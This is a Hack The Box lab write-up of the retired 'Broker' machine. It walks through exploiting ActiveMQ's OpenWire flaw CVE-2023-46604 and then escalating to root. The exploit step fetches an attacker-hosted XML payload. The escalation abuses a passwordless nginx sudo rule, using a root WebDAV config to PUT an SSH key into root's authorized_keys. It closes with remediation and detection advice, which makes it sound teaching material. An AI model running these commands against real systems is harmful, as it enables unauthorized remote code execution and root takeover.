---
title: "Broker — ActiveMQ OpenWire RCE and Unsafe Daemon Sudo"
description: "An Apache ActiveMQ deployment with a vulnerable OpenWire service and default console credentials yields a service-account shell; unrestricted nginx sudo enables a root file-write path."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - activemq
  - sudo
  - configuration-security
objective: "Assess exposed ActiveMQ broker services and the privilege boundary available to the service account."
tools:
  - rustscan
  - nmap
  - sudo
  - nginx
  - ssh-keygen
  - curl
  - ssh
skill: "Unauthenticated message-broker exploitation and daemon configuration abuse for privilege escalation"
outcome: "Unauthenticated code execution as the ActiveMQ service account, escalated to root via a passwordless nginx sudo rule and a WebDAV root file write"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux (Ubuntu) running Apache ActiveMQ 5.15.15 |
| Starting position | Unauthenticated network access |
| Objective | Assess exposed ActiveMQ broker services and the privilege boundary available to the service account |
| Outcome | Service-account code execution and root SSH access via a passwordless nginx sudo rule |

## OpenWire RCE to nginx sudo root

Broker is an Easy-rated Hack The Box Linux lab built around an Apache ActiveMQ 5.15.15 deployment. The OpenWire transport on 61616 is vulnerable to CVE-2023-46604, an unauthenticated remote code execution flaw in the OpenWire marshaller, while the management console accepted default credentials. Exploiting the marshaller returns code execution as the broker service account, and a passwordless sudo rule for the nginx binary allows a root-owned instance with WebDAV writes to place an SSH key for root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Unauthenticated OpenWire exploitation (CVE-2023-46604) → ActiveMQ service-account code execution → passwordless `nginx` sudo → root-owned WebDAV file write → root SSH access**

## Target, messaging services, and objective

- **Target:** Linux (Ubuntu) host running Apache ActiveMQ 5.15.15.
- **Exposed services:** SSH (22), HTTP (80), MQTT (1883), AMQP (5672), management HTTP (8161), STOMP (61613), and OpenWire (61616).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** assess the exposed broker services and the privilege boundary available to the service account.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: OpenWire marshaller to root file write

### 1. Service Enumeration

Observation: a full TCP scan exposed SSH, HTTP, and a cluster of ActiveMQ messaging services.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Truncated scan output:

```text
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu
80/tcp    open  http       nginx 1.18.0
8161/tcp  open  http       Jetty 9.4.39.v20210325
61613/tcp open  stomp      Apache ActiveMQ
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
```

Significance: the exposed ActiveMQ surface defines the attack path: management HTTP on 8161, STOMP on 61613, and OpenWire on 61616. The broker version the scan reported, 5.15.15, falls in the range affected by CVE-2023-46604.

Result: SSH, HTTP, and multiple broker protocols are reachable, and ActiveMQ 5.15.15 is exposed on the OpenWire transport.

### 2. ActiveMQ OpenWire Exploitation (CVE-2023-46604)

Observation: ActiveMQ 5.15.15 is affected by CVE-2023-46604, an unauthenticated remote code execution flaw in the OpenWire marshaller that lets a client cause the broker to instantiate attacker-controlled Spring XML. I expected the reported build to be exploitable; the management console on 8161 also accepted default credentials, though the console was not required for the exploit.

Action: I tried a public CVE-2023-46604 OpenWire proof-of-concept against the target with an attacker-hosted XML payload.

```bash
python3 exploit.py -i <TARGET_IP> -p 61616 -u http://<ATTACKER_HOST>/<PAYLOAD_XML>
```

The payload declares a `java.lang.ProcessBuilder` bean whose constructor argument is the command to run.

Output:

```text
<SERVICE_ACCOUNT>@<HOST>:<SERVICE_DIR>$
```

Significance: OpenWire is reachable without authentication, so the vulnerable marshaller yields code execution regardless of console access. The default console credentials were an independent exposure on the same host.

Result: code execution in the context of the ActiveMQ service account.

### 3. Sudo Privilege Analysis

Observation: the service account could query its own sudo policy.

```bash
sudo -l
```

```text
User <SERVICE_ACCOUNT> may run the following commands on <HOST>:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Significance: the account may run the nginx binary as root without a password. Because nginx accepts a caller-supplied configuration file, this rule is equivalent to broad privileged execution.

Result: a passwordless sudo rule grants the service account the ability to start nginx as root.

### 4. Root File Write via nginx WebDAV

Observation: nginx configuration directives control worker identity, document root, and write-capable modules.

Action: a custom configuration ran workers as root and enabled HTTP PUT.

```bash
sudo /usr/sbin/nginx -c <CONFIG_PATH>
```

Key configuration directives:

```nginx
user root;
http {
    server {
        listen 1339;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

I generated an SSH key and wrote its public half into root's authorized keys over the WebDAV endpoint:

```bash
ssh-keygen -t ed25519 -f <KEY_NAME> -N ""
curl -X PUT http://127.0.0.1:1339/root/.ssh/authorized_keys --data-binary @<KEY_NAME>.pub
```

Authentication as root then confirmed the escalated context:

```bash
ssh -i <KEY_NAME> root@<TARGET_IP>
```

```text
root@<HOST>:~# whoami
root
```

Significance: a root-owned nginx with WebDAV enabled is a controlled root file-write primitive; writing an SSH public key into root's `authorized_keys` converts that write into root shell access.

Result: root command execution is confirmed by the `whoami` output.

## Two decisions: OpenWire over console, root WebDAV

| Decision | Rationale |
|---|---|
| Target the unauthenticated OpenWire service rather than the management console | CVE-2023-46604 is reachable on port 61616 without console authentication; the default console credentials were a separate exposure not required for exploitation |
| Enable root workers and HTTP PUT in the nginx configuration | The sudo rule grants the daemon binary, and configuration directives control process identity and write behavior, producing a root file-write primitive |

## Outcome: service account and root by nginx sudo

The documented path starts with unauthenticated code execution as the ActiveMQ service account through CVE-2023-46604 and reaches root command execution through a passwordless nginx sudo rule abused to write an SSH key into root's `authorized_keys`. The management console's default credentials were a separate exposure and were not required for exploitation.

## Recommendations: OpenWire, console defaults, sudo, and WebDAV

The actions below are recommendations; they were not tested in the lab.

1. **Unauthenticated vulnerable OpenWire transport.** CVE-2023-46604 is an unauthenticated code-execution flaw in the OpenWire marshaller, and it is reachable whenever port 61616 is exposed; exploitation yielded service-account code execution. *Recommendation:* upgrade or patch ActiveMQ and restrict 61616 to trusted networks, disabling OpenWire where it is not required. *Detection:* monitor the broker for unexpected class instantiation and unusual outbound connections initiated from the service account.
2. **Default management console credentials.** The console accepted default credentials, granting authenticated management access independent of the exploit path. *Recommendation:* change default credentials and restrict the management interface to trusted administration networks.
3. **Passwordless sudo for a daemon binary.** A `(ALL : ALL) NOPASSWD: /usr/sbin/nginx` rule let the service account start the daemon as root, and configuration control turned that into broad privileged execution. *Recommendation:* remove sudo rules for general-purpose daemon binaries and use tightly scoped wrappers where privileged operations are necessary. *Detection:* monitor sudo rule changes and nginx invocations that use a non-standard configuration path.
4. **Root-owned workers with WebDAV enabled.** Running workers as root and permitting HTTP PUT produced a root file-write primitive, which was used to place an SSH key for root. *Recommendation:* run workers as an unprivileged user, avoid enabling WebDAV and directory indexing, and restrict write methods. *Detection:* monitor writes to sensitive paths such as `authorized_keys`.

## References

- [Hack The Box — Broker](https://app.hackthebox.com/machines/Broker) (retired machine)
- [NVD — CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604) (Apache ActiveMQ OpenWire unauthenticated remote code execution)
- [Apache ActiveMQ security advisory — CVE-2023-46604](https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt)
- [RustScan](https://github.com/RustScan/RustScan)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [sudoers manual — sudo.ws](https://www.sudo.ws/docs/man/sudoers.man/)
- [nginx command-line switches](https://nginx.org/en/docs/switches.html)
- [nginx `ngx_http_dav_module`](https://nginx.org/en/docs/http/ngx_http_dav_module.html)
- [curl manual page](https://curl.se/docs/manpage.html)
- [`ssh-keygen` — OpenBSD manual](https://man.openbsd.org/ssh-keygen)
- [`sshd` — OpenBSD manual](https://man.openbsd.org/sshd)
